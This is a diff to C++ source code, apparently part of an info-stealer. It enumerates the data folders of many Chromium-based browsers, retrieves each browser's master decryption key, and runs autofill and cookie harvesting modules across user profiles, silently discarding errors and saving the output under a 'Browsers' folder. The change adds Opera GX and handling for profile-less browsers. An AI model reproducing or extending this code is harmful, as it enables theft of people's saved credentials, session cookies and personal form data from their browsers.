@@ -11,24 +11,25 @@
 #include "impl/CAutoFill.h"
 #include "impl/CCookies.h"
 
-static const std::vector<std::pair<std::string, fs::path>> CHROMIUM_BROWSERS = {
-    {"Opera",        Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"               },
-    {"Amigo",        Utils::getLocalPath()   / "Amigo"                / "User Data"                  },
-    {"Torch",        Utils::getLocalPath()   / "Torch"                / "User Data"                  },
-    {"Kometa",       Utils::getLocalPath()   / "Kometa"               / "User Data"                  },
-    {"Orbitum",      Utils::getLocalPath()   / "Orbitum"              / "User Data"                  },
-    {"Epic Private", Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data"                  },
-    {"Cent",         Utils::getLocalPath()   / "CentBrowser"          / "User Data"                  },
-    {"Vivaldi",      Utils::getLocalPath()   / "Vivaldi"              / "User Data"                  },
-    {"Irdium",       Utils::getLocalPath()   / "Iridium"              / "User Data"                  },
-    {"7Star",        Utils::getLocalPath()   / "7Star"                / "7Star"         / "User Data"},
-    {"Sputnik",      Utils::getLocalPath()   / "Sputnik"              / "Sputnik"       / "User Data"},
-    {"Chrome SxS",   Utils::getLocalPath()   / "Google"               / "Chrome SxS"    / "User Data"},
-    {"Chrome",       Utils::getLocalPath()   / "Google"               / "Chrome"        / "User Data"},
-    {"Edge",         Utils::getLocalPath()   / "Microsoft"            / "Edge"          / "User Data"},
-    {"Uran",         Utils::getLocalPath()   / "uCozMedia"            / "Uran"          / "User Data"},
-    {"Yandex",       Utils::getLocalPath()   / "Yandex"               / "YandexBrowser" / "User Data"},
-    {"Brave",        Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser" / "User Data"},
+static const std::vector<std::pair<std::pair<std::string, bool>, fs::path>> CHROMIUM_BROWSERS = {
+    {{"Opera", false},      Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"               },
+    {{"Opera GX", false},   Utils::getRoamingPath() / "Opera Software"       / "Opera GX Stable"            },
+    {{"Amigo",true},        Utils::getLocalPath()   / "Amigo"                / "User Data"                  },
+    {{"Torch",true},        Utils::getLocalPath()   / "Torch"                / "User Data"                  },
+    {{"Kometa",true},       Utils::getLocalPath()   / "Kometa"               / "User Data"                  },
+    {{"Orbitum",true},      Utils::getLocalPath()   / "Orbitum"              / "User Data"                  },
+    {{"Epic Private",true}, Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data"                  },
+    {{"Cent",true},         Utils::getLocalPath()   / "CentBrowser"          / "User Data"                  },
+    {{"Vivaldi",true},      Utils::getLocalPath()   / "Vivaldi"              / "User Data"                  },
+    {{"Irdium",true},       Utils::getLocalPath()   / "Iridium"              / "User Data"                  },
+    {{"7Star",true},        Utils::getLocalPath()   / "7Star"                / "7Star"         / "User Data"},
+    {{"Sputnik",true},      Utils::getLocalPath()   / "Sputnik"              / "Sputnik"       / "User Data"},
+    {{"Chrome SxS",true},   Utils::getLocalPath()   / "Google"               / "Chrome SxS"    / "User Data"},
+    {{"Chrome",true},       Utils::getLocalPath()   / "Google"               / "Chrome"        / "User Data"},
+    {{"Edge",true},         Utils::getLocalPath()   / "Microsoft"            / "Edge"          / "User Data"},
+    {{"Uran",true},         Utils::getLocalPath()   / "uCozMedia"            / "Uran"          / "User Data"},
+    {{"Yandex",true},       Utils::getLocalPath()   / "Yandex"               / "YandexBrowser" / "User Data"},
+    {{"Brave",true},        Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser" / "User Data"},
 };
 
 ChromiumBrowsers::ChromiumBrowsers() {
@@ -44,7 +45,7 @@ ChromiumBrowsers::ChromiumBrowsers() {
 void ChromiumBrowsers::execute(fs::path &root) {
     std::vector<std::thread> threads;
 
-    for(const std::pair<std::string, fs::path> &browser : CHROMIUM_BROWSERS)
+    for(const auto &browser : CHROMIUM_BROWSERS)
     {
         if(!exists(browser.second))
             continue;
@@ -52,7 +53,7 @@ void ChromiumBrowsers::execute(fs::path &root) {
         threads.emplace_back([browser, &root, this]() {
             std::vector<std::thread> moduleThreads;
 
-            fs::path browserRoot = root / "Browsers" / browser.first;
+            fs::path browserRoot = root / "Browsers" / browser.first.first;
 
             std::vector<BYTE> master_key = ChromiumUtil::getMasterKey(browser.second);
 
@@ -64,23 +65,35 @@ void ChromiumBrowsers::execute(fs::path &root) {
             for(ChromiumBrowserModule* module : this->modules)
             {
                 module->setMasterKey(master_key);
-                moduleThreads.emplace_back([module, &browser, &browserRoot, &profiles]() {
-                    for(std::string &profile : profiles)
-                    {
-                        try
-                        {
-                            module->setProfile(profile);
-                            module->execute(browserRoot, browser.first, browser.second);
+                module->setHasProfiles(browser.first.second);
+
+                if(browser.first.second)
+                {
+                    moduleThreads.emplace_back([module, &browser, &browserRoot, &profiles]() {
+                        for(std::string &profile : profiles) {
+                            try {
+                                module->setProfile(profile);
+                                module->execute(browserRoot, browser.first.first, browser.second);
+                            } catch (const std::exception& e) {
+                                #if DEV
+                                    std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
+                                #endif
+                            } catch (...){}
                         }
-                        catch (const std::exception& e)
-                        {
+                    });
+                }
+                else
+                {
+                    moduleThreads.emplace_back([module, &browser, &browserRoot, &profiles]() {
+                        try{
+                            module->execute(browserRoot, browser.first.first, browser.second);
+                        } catch (const std::exception& e){
                             #if DEV
-                                std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
+                            std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
                             #endif
-                        }
-                        catch (...){}
-                    }
-                });
+                        } catch (...){}
+                    });
+                }
             }
 
             for(auto& thread : moduleThreads) {
